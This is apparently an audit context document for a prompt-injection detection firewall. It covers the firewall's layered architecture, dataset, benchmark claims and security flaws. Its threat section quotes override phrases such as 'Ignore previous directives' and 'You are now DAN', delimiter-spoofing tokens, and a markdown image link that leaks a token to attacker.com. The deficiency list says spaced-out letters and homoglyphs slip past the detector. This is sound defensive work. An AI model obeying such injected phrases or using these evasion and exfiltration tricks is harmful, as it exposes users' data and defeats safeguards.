# PID_cys: Project Context & Operational Environment

**Document ID:** AUD-CTX-01  
**Target Repository:** `PID_cys` (Hybrid Prompt Injection Detection Firewall)  
**Classification:** Enterprise Cyber Defense / LLM Systems Security  
**Audit Date:** November 2026  
**Status:** Complete & Verified  

---

## 1. Executive Summary & Purpose

**PID_cys** is an enterprise-oriented, defense-in-depth Prompt Injection Detection Firewall designed to safeguard Large Language Models (LLMs), AI assistants, and autonomous agent workflows. Unlike resource-heavy "LLM-as-a-judge" architectures that incur prohibitive monetary costs (tokens) and multi-second latencies, PID_cys implements a cascaded, tiered filtering pipeline combining:
1. **Layer 1: Sub-millisecond Rule & Delimiter Triage** (using a C-accelerated Aho-Corasick automaton and regular expression heuristics).
2. **Layer 2: Statistical Machine Learning** (TF-IDF N-gram vectorizer paired with a Balanced Logistic Regression classifier).
3. **Layer 3: Semantic Adversarial Guard** (heuristic pattern recognition for roleplay usurpation, hypothetical deception framing, and Shannon character entropy analysis).

The system targets sub-10ms median latency, enabling inline inspection of untrusted prompts before forwarding them to downstream generative AI engines.

---

## 2. Threat Landscape & Problem Statement

Modern generative AI applications face novel attack vectors that subvert classical security controls:
- **Direct Prompt Injections / Jailbreaks:** Adversaries use explicit semantic commands (e.g., "Ignore previous directives", "You are now DAN", "Do Anything Now") to force the LLM to abandon its system instructions, disable safety guardrails, or disclose confidential directives.
- **System Prompt Extraction:** Adversaries trick the LLM into repeating or revealing proprietary system instructions, hidden developer guidance, or sensitive context tokens.
- **Delimiter Spoofing & Context Escaping:** Adversaries mimic framework-level delimiters (e.g., `<|im_start|>`, `### System`, `--- END OF CONTEXT ---`) to deceive the model into treating untrusted user input as high-authority system commands.
- **Indirect Payload Injection & Exfiltration:** Untrusted third-party content (e.g., scraped web pages, resume PDFs, emails) contains stealth instructions that command the agent to exfiltrate private data via markdown image rendering (`![leak](https://attacker.com?token=...)`) or secondary tool invocations.

PID_cys was engineered to sit between untrusted input channels (web chat, API integrations, agent tools) and the LLM inference endpoint, providing real-time `ALLOW`, `AUDIT`, or `BLOCK` verdicts.

---

## 3. Technology Stack & Runtime Profile

| Layer | Component | Version / Specification | Role in Architecture |
| :--- | :--- | :--- | :--- |
| **Language** | Python | 3.12.14 (requires >= 3.10) | Core execution environment |
| **Web Gateway** | FastAPI / Uvicorn | 0.115+ / 0.30+ | Microservice API and static asset hosting |
| **Fast Pattern Matching** | PyAhoCorasick | 2.1.0 (C-extension) | $O(N)$ string automaton for L1 triage |
| **Machine Learning** | Scikit-Learn, NumPy, SciPy | 1.4+, 1.26+, 1.12+ | TF-IDF feature extraction & Logistic Regression |
| **Data Serialization** | Joblib | 1.4+ | Binary persistence of ML pipeline |
| **Validation & Schema** | Pydantic v2 | 2.7+ | Strict schema validation for datasets and API models |
| **Data Wrangling** | Pandas | 2.2+ | Corpus curation, fusion, and split generation |
| **Test Harness** | Pytest, AnyIO | 8.0+, 4.15+ | Automated unit, integration, and regression testing |
| **Front-End UI** | HTML5, CSS3, Vanilla JS | Standalone Single-Page App | Dark-mode Executive Cyber Console dashboard |

### Heavyweight Dependency Anomaly:
`requirements.txt` specifies `torch>=2.2.0`, `transformers>=4.40.0`, `accelerate>=0.30.0`, and `datasets>=2.19.0`. However, our audit confirmed that **none** of these deep learning packages are imported or utilized in the active codebase (`src/`). Conversely, critical runtime dependencies `fastapi`, `uvicorn`, `joblib`, and `httpx` are omitted from `requirements.txt`.

---

## 4. Repository Structure & Module Map

```
PID_cys/
├── main.py                      # Master entrypoint: CLI argument parser and Uvicorn server launcher
├── requirements.txt             # Dependency specification (contains bloat & missing packages)
├── pyproject.toml               # Build configuration, metadata, and pytest configuration
├── README.md                    # System documentation, benchmark claims, and quickstart
│
├── models/
│   ├── baseline_model.joblib    # 950 KB serialized Scikit-learn Pipeline (TF-IDF + LogisticRegression)
│   └── baseline_metrics.json    # Static test set benchmark metrics (97.98% accuracy claim)
│
├── data/
│   └── processed/
│       ├── master_dataset.jsonl # 23,821 curated prompt samples (benign vs malicious)
│       ├── train.jsonl          # 16,674 training samples (70% split)
│       ├── val.jsonl            # 3,573 validation samples (15% split)
│       ├── test.jsonl           # 3,574 test samples (15% split)
│       ├── Prompt_INJECTION_And_Benign_DATASET.jsonl # Legacy 500-sample seed dataset
│       ├── archive-2/           # Raw CSV datasets (v3update20001, update1357, etc.)
│       └── archive-3/           # Raw CSV datasets (CommandInjection, harmful_behaviors)
│
├── src/
│   ├── __init__.py              # Package marker
│   ├── cli.py                   # Standalone CLI tool for terminal inspection
│   │
│   ├── api/
│   │   ├── __init__.py
│   │   └── server.py            # FastAPI REST microservice & static dashboard server
│   │
│   ├── engine/
│   │   ├── __init__.py
│   │   ├── hybrid_detector.py   # Master orchestrator: multi-layer cascade & arbitration engine
│   │   ├── rule_triage.py       # Layer 1: Sub-millisecond Aho-Corasick & regex engine
│   │   └── semantic_guard.py    # Layer 3: Adversarial framing heuristics & Shannon entropy
│   │
│   ├── dataset/
│   │   ├── __init__.py
│   │   ├── schema.py            # Pydantic data models (PromptSample, InjectionType, AttackFamily)
│   │   ├── corpus_builder.py    # Synthetic prompt generator & stratified split pipeline
│   │   ├── merge_data.py        # Multi-source dataset fusion & deduplication script
│   │   └── train_baseline.py    # Baseline ML model training script (incomplete persistence)
│   │
│   └── web/
│       └── index.html           # Dark-mode single-page cyber monitoring dashboard
│
├── tests/
│   ├── test_rules.py            # Unit tests for Layer 1 Aho-Corasick & regex matching
│   ├── test_hybrid.py           # Integration tests for HybridPromptDetector orchestration
│   ├── test_api.py              # End-to-end HTTP tests for FastAPI endpoints
│   ├── test_corpus.py           # Validation tests for processed dataset files
│   └── test_schema.py           # Unit tests for Pydantic schema validation
│
└── audit/                       # Complete autonomous multi-agent audit documentation suite
```

---

## 5. Execution Pipeline & Cascaded Architecture

```
[ Incoming Untrusted Prompt ]
             │
             ▼
┌────────────────────────────────────────────────────────┐
│  LAYER 1: Sub-Millisecond Rule & Signature Triage      │
│  - PyAhoCorasick Automaton (Exact match, 22 patterns)   │
│  - Delimiter Spoofing Regex (### System, <|im_start|>) │
│  - Markdown Exfiltration Regex (![exfil](https://...)) │
└────────────────────────────┬───────────────────────────┘
                             │
            ┌────────────────┴────────────────┐
            │ [Confidence >= 0.95]            │ [Ambiguous / Clean]
            ▼                                 ▼
   🚨 FAST-PATH SHORT CIRCUIT        ┌──────────────────────────────────────────────┐
      (Instant BLOCK, ~0.004 ms)     │  LAYER 2: Statistical Machine Learning       │
                                     │  - 20,000 N-gram TF-IDF Vectorizer           │
                                     │  - Balanced Logistic Regression (ml_prob)    │
                                     └──────────────────────┬───────────────────────┘
                                                            │
                                  ┌─────────────────────────┴────────────────────────┐
                                  │ [ml_prob in 0.20-0.85]                           │ [ml_prob < 0.20 or > 0.85]
                                  ▼                                                  ▼
                     ┌────────────────────────────────────────┐             Direct ML Decision
                     │  LAYER 3: Semantic Adversarial Guard   │             ALLOW (< 0.50)
                     │  - Roleplay & Persona Regexes          │             AUDIT (0.50-0.69)
                     │  - Hypothetical Deception Framing      │             BLOCK (>= 0.70)
                     │  - Shannon Character Entropy (> 4.85)  │
                     └───────────────────┬────────────────────┘
                                         │
                                         ▼
                             ARBITRATION ENGINE
                  combined_risk = (ml_prob * 0.6) + (l3_score * 0.4)
                     ALLOW (0.0-0.49) | AUDIT (0.50-0.69) | BLOCK (0.70-1.0)
```

---

## 6. Machine Learning Baseline & Dataset Profile

The system includes a master corpus of 23,821 prompts fused from multiple open-source repositories:
- **Benign Prompts:** 20,742 samples (87.1%) covering Python/JavaScript coding queries, academic topics, system administration questions, and security discussions.
- **Malicious Prompts:** 3,079 samples (12.9%) covering direct jailbreaks (DAN, EvilBot), system prompt extraction, delimiter injection, and harmful instructions.

### Claimed vs. Actual Benchmarks:
- **Reported Accuracy:** 97.98% overall accuracy on 3,574 unseen test samples.
- **Reported Precision / Recall on Attacks:** 89.96% precision, 95.02% recall.
- **Critical Audit Discovery:** The training script `src/dataset/merge_data.py` incorporated `archive-3/harmful_behaviors.csv` (safety goals like "Develop malware") directly as attack samples. Because of this, benign coding requests such as *"Develop a game using Python and Pygame"* trigger heavy positive feature weights on `"develop"` (+3.5017), resulting in an erroneous **87.6% CRITICAL BLOCK** on benign developer queries.

---

## 7. Key Stakeholders & Integration Personas

1. **Security Operations Center (SOC) & SecOps Engineers:** Need real-time monitoring of jailbreak attempts, SIEM-compatible audit logging (CEF/Syslog), alert webhooks, and zero false-positive disruption to legitimate user traffic.
2. **AI Platform Engineers & Developers:** Require an ultra-low latency (<5ms) Python SDK or OpenAI-compatible inline reverse proxy that operates transparently between clients and upstream LLM providers (e.g., Anthropic, OpenAI, Bedrock, vLLM).
3. **Compliance & Risk Officers:** Require reproducible model lineage, cryptographic verification of ML artifacts, and adherence to OWASP Top 10 for LLM Applications (specifically LLM01: Prompt Injection).

---

## 8. Summary of Critical Deficiencies Identified

1. **Adversarial Evasion Vulnerability:** Simple character spacing (`I g n o r e   a l l...`), Cyrillic homoglyphs, and non-English prompts completely bypass all three detection layers, receiving an `ALLOW (Safe)` verdict with a 0.178 risk score.
2. **Heuristic Risk Dilution:** When Layer 2 ML detects an attack with high confidence (e.g., 0.81), any weak anomaly detected by Layer 3 (e.g., 0.25) dilutes the combined score to 0.58, downgrading an instant BLOCK to a permissive AUDIT.
3. **Severe Codebase & Repository Contamination:** 42,774 files are committed to Git, including an entire 1.3 GB `.venv/` directory with local developer path references (`/Users/rudratomar/...`), compiled bytecode (`.pyc`), and `.DS_Store` files. `.gitignore` is completely absent.
4. **Unauthenticated & Insecure Endpoints:** No authentication or API keys; wide-open CORS (`allow_origins=["*"]` + `allow_credentials=True`); unvalidated pickle deserialization via `joblib.load()`; DOM-based XSS in the web dashboard.
5. **Non-Reproducible Pipeline:** `train_baseline.py` trains disjoint objects and fails to persist `baseline_model.joblib` or `baseline_metrics.json`.
